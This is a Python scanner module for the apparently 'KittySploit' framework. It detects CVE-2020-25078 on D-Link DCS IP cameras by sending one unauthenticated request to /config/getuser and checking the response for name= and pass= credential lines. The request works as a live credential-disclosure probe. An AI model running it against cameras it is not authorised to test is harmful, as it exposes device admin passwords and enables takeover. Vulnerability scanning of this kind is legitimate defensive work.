#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DCS IP camera credential disclosure via /config/getuser (CVE-2020-25078)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DCS - Unauth Credential Disclosure Detection (CVE-2020-25078)',
        'description': (
            'Detects CVE-2020-25078 by requesting /config/getuser?index=0 and looking for '
            'name=/pass= credential lines without authentication.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'dlink', 'camera', 'iot',
            'info-disclosure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10180',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-25078',
        ],
        'cve': 'CVE-2020-25078',
    }

    def run(self):
        path = '/config/getuser?index=0'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if re.search(r'(?m)^name=.+', body) and re.search(r'(?m)^pass=.+', body):
            self.set_info(
                severity='critical',
                reason='D-Link DCS unauth credential disclosure (CVE-2020-25078)',
                path=path,
            )
            return True
        return False
